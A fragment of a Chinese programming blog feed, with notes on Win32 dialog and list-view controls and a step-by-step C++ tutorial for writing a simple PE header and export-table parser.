&#125;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    <span class="keyword">return</span> FALSE;<span class="comment">//没能处理返回无</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> TRUE;<span class="comment">//处理返回真</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建模态：</p><p>它不需要捕获信息，也不需要显示</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">DialogBoxW</span>( <span class="comment">/* same */</span>)</span><br><span class="line"><span class="comment">//结束</span></span><br><span class="line"><span class="built_in">EndDialog</span>(hWnd, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>介绍一些简单的控件：</p><p>windowsx.h 头有定义操作控件信息的宏，可读性更高；</p><p>复选框，单选框，属于按钮类，其信息为 BM_打头；</p><p>图片，其信息 STM_打头；</p><p>滑块和进度条，其信息 TBM_ PBM_ 打头；</p><h2 id="列表控件"><a href="#列表控件" class="headerlink" title="列表控件"></a>列表控件</h2><p>任务管理器就是一个列表；</p><p>其重要的信息是 ： <code>LVM_INSERTCOLUMN</code> ，插入索引；</p><p>其会用到一个结构：LVCOLUMN，其中标识了列表信息；</p><p>mask是掩码，说明了之后的成员有效性；</p><p>fmt是对齐方式，cx是大小，pszText为名字；</p><p>插入行： <code>LVM_INSERTITEM</code> ；</p><p>设置行： <code>LVM_SETITEMTEXT</code> ；</p><p>其结构和上面类似，叫 LVITEM；</p><p>item是第几行，subitem是第几列；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">InsertColum</span><span class="params">(HWND hwnd, <span class="keyword">int</span> id, <span class="keyword">int</span> nColum, <span class="keyword">int</span> cx, LPWSTR name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">LVCOLUMNW lvColumn = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">lvColumn.mask = LVCF_FMT | LVCF_WIDTH | LVCF_TEXT;</span><br><span class="line">lvColumn.fmt = LVCFMT_CENTER;</span><br><span class="line">lvColumn.cx = cx;</span><br><span class="line">lvColumn.pszText = name;</span><br><span class="line"><span class="built_in">SendDlgItemMessageW</span>(hwnd, id, LVM_INSERTCOLUMNW, nColum, (LPARAM) &amp; lvColumn);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">InsertItem</span><span class="params">(HWND hwnd, <span class="keyword">int</span> id, <span class="keyword">int</span> item)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">LVITEMW lvItem = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">lvItem.mask = LVIF_TEXT;</span><br><span class="line">lvItem.iItem = item;</span><br><span class="line">lvItem.pszText = (LPWSTR)<span class="string">L&quot;&quot;</span>;</span><br><span class="line"><span class="built_in">SendDlgItemMessageW</span>(hwnd, id, LVM_INSERTITEMW, <span class="number">0</span>, (LPARAM)&amp;lvItem);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">SetListItemText</span><span class="params">(HWND hwnd, <span class="keyword">int</span> id, <span class="keyword">int</span> item, <span class="keyword">int</span> subItem, LPWSTR name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">LVITEMW lvItem = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">lvItem.mask = LVIF_TEXT;</span><br><span class="line">lvItem.iItem = item;</span><br><span class="line">lvItem.iSubItem = subItem;</span><br><span class="line">lvItem.pszText = name;</span><br><span class="line"><span class="built_in">SendDlgItemMessageW</span>(hwnd, id, LVM_SETITEMTEXTW, item, (LPARAM)&amp;lvItem);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>添加样式：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sendDlgItemMessageW</span>(hwnd, id, LVM_SETEXTENDEDLISTVIEWSTYLE, <span class="number">0</span>, style)</span><br></pre></td></tr></table></figure><p>常用style有：LVS_EX_FULLROWSELECT ， 全行选中；</p><p>​            LVS_EX_GRIDLINES    ,  添加网格；</p><p>点击其成员触发notify信息，其有 NMHDR 结构：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">nmhdr</span> &#123;</span></span><br><span class="line">  HWND hwndFrom;<span class="comment">//发起信息句柄</span></span><br><span class="line">  UINT idFrom;<span class="comment">//id</span></span><br><span class="line">  UINT code;<span class="comment">//操作码</span></span><br><span class="line">&#125; NMHDR;</span><br></pre></td></tr></table></figure><p>如果确认控件是list，则结构体为 NMLISTVIEW ，为 NMHDR 的继承；</p><p>捕获点击消息：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_NOTIFY:</span><br><span class="line">&#123;</span><br><span class="line">    NMHDR* pnmHeader = (NMHDR*)lParam;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span>(pnmHeader-&gt;code)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> NM_CLICK:</span><br><span class="line">            &#123;</span><br><span class="line">                ...</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种捕获类似于下拉表；</p><p>获取dll文件函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HMODULE hModule = <span class="built_in">LoadLibraryW</span>(<span class="string">L&quot;./mydll.dll&quot;</span>);</span><br><span class="line"><span class="built_in">GetProcAddress</span>(hModule, <span class="string">&quot;func_name&quot;</span>);<span class="comment">//返回一个函数指针</span></span><br><span class="line"><span class="built_in">FreeLibrary</span>(hModule);</span><br></pre></td></tr></table></figure><h2 id="Lab"><a href="#Lab" class="headerlink" title="Lab"></a>Lab</h2><p>搓了个CPP的类粘合着窗口化编程使用做了个小程序，提取码 <code>a333</code> ;</p><p><a href="https://pan.baidu.com/s/1GSH23Z8ROKBB35PUa_Swxw">原神伤害云计算</a>；</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;重要头文件：windows.h；&lt;/p&gt;
&lt;p&gt;word 是字，占2个字节；&lt;/p&gt;
&lt;p&gt;不会的函数可以去微软查出来，vs里选中F1；&lt;/p&gt;
&lt;p&gt;链接器 子系统 选择 窗口；&lt;/p&gt;
&lt;p&gt;windows是操作&lt;strong&gt;消息&lt;/strong&gt;的，它有一个消息队列</summary>
      
    
    
    
    <category term="Diary" scheme="https://secondbc.github.io/SecondBC/categories/Diary/"/>
    
    
    <category term="Win" scheme="https://secondbc.github.io/SecondBC/tags/Win/"/>
    
  </entry>
  
  <entry>
    <title>PE简单解析器</title>
    <link href="https://secondbc.github.io/SecondBC/2022/11/12/PE%E7%AE%80%E5%8D%95%E8%A7%A3%E6%9E%90%E5%99%A8/"/>
    <id>https://secondbc.github.io/SecondBC/2022/11/12/PE%E7%AE%80%E5%8D%95%E8%A7%A3%E6%9E%90%E5%99%A8/</id>
    <published>2022-11-11T17:11:29.000Z</published>
    <updated>2023-07-17T08:59:34.026Z</updated>
    
    <content type="html"><![CDATA[<p>了解PE的结构：<a href="https://zhuanlan.zhihu.com/p/31967907">https://zhuanlan.zhihu.com/p/31967907</a>  </p><p>作为练手的记录, 学习性不是很强；</p><p>记录一些术语：</p><p>魔术码 = 幻码 = 特征码；</p><p>结构体中单个内容 = 字段；</p><p>rva = 内存中偏移；</p><p>foa = 文件中偏移；</p><p>静态 = 文件中的处理；</p><p>动态 = 内存中的处理；</p><p>IAT = 导入地址表 = import address table</p><p>INT = 导入名称表 = import name table</p><h2 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h2><p>定义一些简单的类型：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> UINT8;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> UINT16;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> UINT32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> UINT64;</span><br></pre></td></tr></table></figure><p>解析一个PE文件首先需要读取二进制内容；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取文件长度</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_file_size</span><span class="params">(FILE* fp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fseek</span>(fp, <span class="number">0</span>, SEEK_END);</span><br><span class="line"><span class="keyword">int</span> size = <span class="built_in">ftell</span>(fp);</span><br><span class="line"><span class="built_in">fseek</span>(fp, <span class="number">0</span>, SEEK_SET);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//读文件</span></span><br><span class="line"><span class="keyword">char</span> filename[] = <span class="string">&quot;a.exe&quot;</span>;</span><br><span class="line">FILE* fp = <span class="built_in">fopen</span>(filename, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fsize = <span class="built_in">get_file_size</span>(fp);</span><br><span class="line"></span><br><span class="line">UINT8* fbuffer = (UINT8*)<span class="built_in">malloc</span>(fsize);</span><br><span class="line"><span class="built_in">fread</span>(fbuffer, <span class="number">1</span>, fsize, fp);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fclose</span>(fp);</span><br></pre></td></tr></table></figure><p>利用如上代码便可以将 a.exe 的内容复制给 fbuffer 缓冲区，之后在这个缓冲区上进行操作；</p><h2 id="解析DOS头"><a href="#解析DOS头" class="headerlink" title="解析DOS头"></a>解析DOS头</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取dos头</span></span><br><span class="line">UINT8* p_dos_header = fbuffer;</span><br><span class="line"></span><br><span class="line">UINT16 dos_magic = (UINT16) * ((UINT16*)p_dos_header);</span><br><span class="line">UINT32 pe_offset;</span><br><span class="line"><span class="keyword">if</span> (dos_magic != <span class="number">0x5a4d</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s it&#x27;s not a valid PE file.\n&quot;</span>, filename);</span><br><span class="line">    <span class="built_in">free</span>(fbuffer);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    pe_offset = (UINT32) * (UINT32*)(p_dos_header + <span class="number">0x40</span> - <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里只捕获了两个重要的内容，也就是 dos magic 和 pe offset，第一个能判断这个文件是否为一个PE文件，第二能由此找到PE头，也就是常说的NT头；</p><h2 id="解析PE头"><a href="#解析PE头" class="headerlink" title="解析PE头"></a>解析PE头</h2><p>也称NT头；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取pe头</span></span><br><span class="line">UINT8* p_pe_header = (p_dos_header + pe_offset);</span><br><span class="line"></span><br><span class="line">UINT32 pe_magic = (UINT32) * ((UINT32*)p_pe_header);</span><br><span class="line"><span class="keyword">if</span> (pe_magic != <span class="number">0x4550</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s it&#x27;s pe magic number wrong: %x\n&quot;</span>, filename, pe_magic);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据dos头里获得的pe偏移，利用dos头指针找到pe头，由此给出pe魔术码；</p><h3 id="解析file头"><a href="#解析file头" class="headerlink" title="解析file头"></a>解析file头</h3><p>file头，可称为标准PE头；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取file头</span></span><br><span class="line">UINT8* p_file_header = p_pe_header + <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">UINT16 machine_num = (UINT16) * ((UINT16*)p_file_header);</span><br><span class="line">UINT16 number_of_sections = (UINT16) * (UINT16*)(p_file_header + <span class="number">2</span>);</span><br><span class="line">UINT16 size_of_optional_header = (UINT16) * (UINT16*)(p_file_header + <span class="number">16</span>);</span><br><span class="line">UINT16 file_characteristics = (UINT16) * (UINT16*)(p_file_header + <span class="number">18</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;it&#x27;s machine number is %xh\n&quot;</span>, machine_num);</span><br></pre></td></tr></table></figure><p>根据pe头能找到file头，给出其中4个重要内容，由上往下依次是：</p><ol><li>CPU架构码，代表能在什么架构上运行，0值默认都行；</li><li>节区数量，记录节的总数；</li><li>可选头大小，默认e0h是32位, f0h是64位；</li><li>特性，每位都代表一个内容，具体是什么用 010 editor 查看；</li></ol><p>之后便给出CPU架构码；</p><h3 id="解析可选头"><a href="#解析可选头" class="headerlink" title="解析可选头"></a>解析可选头</h3><p>optional头，也称可选PE头；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取可选头</span></span><br><span class="line">UINT8* p_optional_header = p_file_header + <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">UINT16 optional_magic = (UINT16) * ((UINT16*)p_optional_header);</span><br><span class="line">UINT32 oep_offset = (UINT32) * (UINT32*)(p_optional_header + <span class="number">16</span>);</span><br><span class="line">UINT64 image_base = (UINT64) * (UINT64*)(p_optional_header + <span class="number">24</span>);</span><br><span class="line">UINT32 section_alignment = (UINT32) * (UINT32*)(p_optional_header + <span class="number">32</span>);</span><br><span class="line">UINT32 file_alignment = (UINT32) * (UINT32*)(p_optional_header + <span class="number">36</span>);</span><br><span class="line">UINT32 size_of_image = (UINT32) * (UINT32*)(p_optional_header + <span class="number">56</span>);</span><br><span class="line">UINT32 size_of_headers = (UINT32) * (UINT32*)(p_optional_header + <span class="number">60</span>);</span><br><span class="line">UINT16 dll_characteristics = (UINT16) * (UINT16*)(p_optional_header + <span class="number">70</span>);</span><br><span class="line"><span class="keyword">if</span> (size_of_optional_header == <span class="number">0xe0</span> &amp;&amp; optional_magic == <span class="number">0x10b</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;standard 32bit mode.\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(optional_magic == <span class="number">0x10b</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;32bit mode but size of optional header: %x\n&quot;</span>, size_of_optional_header);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(size_of_optional_header == <span class="number">0xf0</span> &amp;&amp; optional_magic == <span class="number">0x20b</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;standard 64bit mode.\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (optional_magic == <span class="number">0x20b</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;64bit mode but size of optional header: %x\n&quot;</span>, size_of_optional_header);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;OEP is at 0x%x\n&quot;</span>, image_base + oep_offset);</span><br></pre></td></tr></table></figure><p>根据PE头能找到可选头，给出其中8个重要内容，从下往上依次是：</p><ol><li>可选魔术码，标准是32位还是64位，分别用10bh和20bh代表；</li><li>oep偏移，相对加载内存地址的程序入口地址的偏移，配合image_base食用；</li><li>内存地址实际加载处，注意，如果开了 随机基址（动态基址）则无用，动态基址在第8个里可查看是否开启；</li><li>内存中对齐，默认1000h；</li><li>文件中对齐，默认200h；</li><li>内存中整个文件大小；</li><li>文件中所有头部大小，包括 dos头，dos存根，nt头，节区头；</li><li>类似之前的特性，也是每一位代表一个内容，具体用 010 editor 查看；</li></ol><p>之后给出位模式和oep地址；</p><h2 id="解析节区头"><a href="#解析节区头" class="headerlink" title="解析节区头"></a>解析节区头</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取节区头</span></span><br><span class="line">UINT8* p_section_header = p_optional_header + size_of_optional_header;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> section_name[<span class="number">9</span>];</span><br><span class="line">UINT32 VA;</span><br><span class="line">UINT32 PA;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; number_of_sections; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)</span><br><span class="line">    &#123;</span><br><span class="line">        section_name[j] = p_section_header[j];</span><br><span class="line">    &#125;</span><br><span class="line">    section_name[<span class="number">8</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    VA = (UINT32) * (UINT32*)(p_section_header + <span class="number">12</span>);</span><br><span class="line">    PA = (UINT32) * (UINT32*)(p_section_header + <span class="number">20</span>);</span><br><span class="line">    VA += image_base;</span><br><span class="line">    PA += image_base;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%-40s VA 0x%016jx \n                                         PA 0x%016jx \n--------------------\n&quot;</span>, section_name, VA, PA);</span><br><span class="line">    p_section_header += <span class="number">0x28</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用可选头和其大小，跳转到节区头，并利用文件头中获取的节区数量进行循环打印名称，并打印其中每个节区的内存中（VA）地址和文件中（PA）地址；</p><h3 id="关于对齐和偏移"><a href="#关于对齐和偏移" class="headerlink" title="关于对齐和偏移"></a>关于对齐和偏移</h3><p>偏移都是相对image base而言；</p><p>因为在文件中和内存中有不同的对齐，所以才有不同的偏移值，而对齐是相对于区段而言，区段与区段之间，头与区段之间会填充对齐；</p><p>当知晓一个<strong>地址的VA偏移</strong>，且知晓这个<strong>地址属于哪个区段</strong>，便可得出这个<strong>地址的PA偏移</strong>；</p><p>why？</p><p>因为区段内不存在对齐改变偏移，所以有等式：地址VA - 区段VA = 区段与地址的距离</p><p>​                                   地址PA - 区段PA = 区段与地址的距离</p><p>所以有 地址PA = 地址VA - 区段VA + 区段PA；</p><p>定义转换函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">UINT32 <span class="title">vtop</span><span class="params">(UINT32 rva, UINT8* p_section_header, UINT16 number_of_sections)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">UINT32 VA;</span><br><span class="line">UINT32 PA;</span><br><span class="line">UINT32 true_size;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; number_of_sections; i++)</span><br><span class="line">&#123;</span><br><span class="line">VA = (UINT32) * (UINT32*)(p_section_header + <span class="number">12</span>);</span><br><span class="line">PA = (UINT32) * (UINT32*)(p_section_header + <span class="number">20</span>);</span><br><span class="line">true_size = (UINT32) * (UINT32*)(p_section_header + <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((rva &gt;= VA) &amp;&amp; (rva &lt; VA + true_size))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> (rva - VA + PA);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">p_section_header += <span class="number">0x28</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;rva error\n\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当rva存在在一个区段的内部时，也就是if判断，就可以执行转换了，如果没找到，就是错误的rva；</p><h2 id="打印导出表"><a href="#打印导出表" class="headerlink" title="打印导出表"></a>打印导出表</h2><p>导出表是可选头最后一个结构体数组的第一个索引来寻找的；</p><p>注意：导出表很多内容本质是rva，导出表结构可自行百度；</p><p>所以找到特别的结构体数组：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取datadirarray数组</span></span><br><span class="line">UINT32 datadirarray_index = (UINT32) * (UINT32*)(p_section_header - <span class="number">0x84</span>);</span><br><span class="line">UINT8* datadirarray = p_section_header - <span class="number">0x80</span>;</span><br></pre></td></tr></table></figure><p>因为32位和64位op头长度不同，所以都能用的情况就是用节区头去反着找；</p><p>这个数组的每个结构体都只有一个实际的内容，就是记录表或者项目的rva；</p><p>之后根据 datadirarray 找到导出表：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取导出表</span></span><br><span class="line"><span class="keyword">if</span> ((UINT32) * (UINT32*)(datadirarray) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    UINT8* export_table = <span class="built_in">vtop</span>((UINT32) * (UINT32*)(datadirarray), p_section_header, number_of_sections) + fbuffer;</span><br><span class="line">    UINT32 etnamead = (UINT32) * (UINT32*)(export_table + <span class="number">12</span>);</span><br><span class="line">    UINT8* etname = <span class="built_in">vtop</span>(etnamead, p_section_header, number_of_sections) + fbuffer;</span><br><span class="line">    UINT32 number_of_functions = (UINT32) * (UINT32*)(export_table + <span class="number">20</span>);</span><br><span class="line">    UINT32 number_of_names = (UINT32) * (UINT32*)(export_table + <span class="number">24</span>);</span><br><span class="line">    UINT8* ad_of_funcs = <span class="built_in">vtop</span>((UINT32) * (UINT32*)(export_table + <span class="number">28</span>), p_section_header, number_of_sections) + fbuffer;</span><br><span class="line">    UINT8* ad_of_names = <span class="built_in">vtop</span>((UINT32) * (UINT32*)(export_table + <span class="number">32</span>), p_section_header, number_of_sections) + fbuffer;</span><br><span class="line">    UINT8* ad_of_ordis = <span class="built_in">vtop</span>((UINT32) * (UINT32*)(export_table + <span class="number">36</span>), p_section_header, number_of_sections) + fbuffer;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%s\n\n&quot;</span>, etname);</span><br><span class="line">    <span class="keyword">int</span> flag;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; number_of_functions; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        flag = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%016jx&quot;</span>, (UINT32) * (UINT32*)(ad_of_funcs + <span class="number">4</span> * i) + image_base);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; number_of_names; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            flag = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (i == (UINT16) * (UINT16*)(ad_of_ordis + <span class="number">2</span> * j))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;                    %3d     %s\n&quot;</span>, i, <span class="built_in">vtop</span>((UINT32) * (UINT32*)(ad_of_names + <span class="number">4</span> * j), p_section_header, number_of_sections) + fbuffer);</span><br><span class="line">                flag = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (flag == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;                            ---\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;no export..\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先需要有 导出表，也就是 datadirarray[0] 有存在的rva，然后利用rva去静态地找到导出表；</p><p>之后同样的道理，找到导出表名称，接着是导出函数数，以及有名称的函数数；</p><p>然后是三个表：函数地址表，函数序数表，函数名称表；</p><p>关系如下：</p><p><img src="https://s2.loli.net/2022/11/11/Tm3G7nZBRjDX2yJ.png" 